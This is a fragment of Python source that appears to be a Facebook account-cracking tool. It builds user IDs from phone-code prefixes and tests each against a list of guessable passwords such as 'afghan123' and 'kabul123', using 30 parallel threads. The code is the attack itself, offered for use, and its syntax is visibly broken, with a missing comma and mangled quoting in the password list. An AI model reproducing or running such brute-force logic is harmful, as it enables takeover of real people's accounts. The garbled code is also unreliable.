flabel 'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 9378, 9377, 9370, 9376')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            uid = code+guru
            pwx = [guru,uid,uid[:7],uid[:6]'۱۲۳۴۵۶,۱۲۳۴۵۶۷۸۹,۱۰۰۲۰۰,afghan,afghan12345,afghan123,600700,afghanistan','afghan1122,500500,100200,10002000,900900,kabul123']
